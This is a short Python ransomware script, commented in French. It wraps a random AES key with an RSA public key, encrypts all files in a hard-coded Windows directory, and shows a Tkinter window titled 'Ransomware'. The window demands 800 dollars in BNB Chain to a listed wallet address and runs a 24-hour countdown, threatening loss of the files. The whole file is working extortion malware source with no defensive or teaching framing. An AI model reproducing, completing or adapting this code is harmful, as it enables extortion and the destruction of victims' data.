from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
import os
import tkinter as tk
from datetime import datetime, timedelta
from PIL import Image, ImageTk



# Charger la clé RSA publique pour le chiffrement
with open("public_key.pem", "rb") as public_file:
    public_key = RSA.import_key(public_file.read())

# Générer une clé de session AES pour le chiffrement des fichiers
aes_key = get_random_bytes(16)

# Chiffrement de la clé AES avec la clé publique RSA
cipher_rsa = PKCS1_OAEP.new(public_key)
enc_aes_key = cipher_rsa.encrypt(aes_key)

# Spécifiez le chemin complet du répertoire source à chiffrer
source_directory = "C:\\Users\\NWORK 3\\Desktop\\Ranso\\encrypted_files"

# Créer un répertoire pour stocker les fichiers chiffrés
if not os.path.exists("encrypted_files"):
    os.makedirs("encrypted_files")

# Chiffrer tous les fichiers dans le répertoire source et les stocker dans le répertoire chiffré
for filename in os.listdir(source_directory):
    with open(os.path.join(source_directory, filename), "rb") as file:
        plaintext = file.read()

    cipher_aes = AES.new(aes_key, AES.MODE_EAX)
    ciphertext, tag = cipher_aes.encrypt_and_digest(plaintext)

    with open(os.path.join("encrypted_files", filename), "wb") as encrypted_file:
        [encrypted_file.write(x) for x in (enc_aes_key, cipher_aes.nonce, tag, ciphertext)]

print("Les fichiers ont été chiffrés et sauvegardés dans le répertoire encrypted_files.")
def update_countdown():
    current_time = datetime.now()
    remaining_time = end_time - current_time
    if remaining_time.total_seconds() <= 0:
        label.config(text="Temps écoulé!")
    else:
        countdown = str(remaining_time).split(".")[0]
        label.config(text=countdown)
    root.after(1000, update_countdown)

# Crée une fenêtre Tkinter
root = tk.Tk()
label2 = tk.Label(root, text="your data is encrypted, pay me 800 dollars in BNB Chain\n on this address to unlock it\n0xc5141E0964425069f1c0c34c4B310b9fa5Dc1614", font=('calibri', 10, 'bold'))
label2.pack()
root.title("Ransomware")
root.geometry("500x300")
root.resizable(False, False)
#root.iconbitmap('demon-2.ico')
# Charge l'image de fond
#background_image = Image.open("demon-2.jpg")  # Remplacez "background.jpg" par le chemin de votre image
#background_photo = ImageTk.PhotoImage(background_image)
#background_label = tk.Label(root, image=background_photo)
#background_label.place(relwidth=1, relheight=1)

# Calcule l'heure de fin
end_time = datetime.now() + timedelta(hours=24)

# Crée une étiquette pour afficher le compte à rebours
label = tk.Label(root, font=("Helvetica", 48), fg="black", bg='red')
label.pack(pady=20)

# Lance la fonction de mise à jour du compte à rebours
label2 = tk.Label(root, text=" if the runs out your file will be gone!!", font=('calibri', 10, 'bold'))
label2.pack()

update_countdown()

root.mainloop()
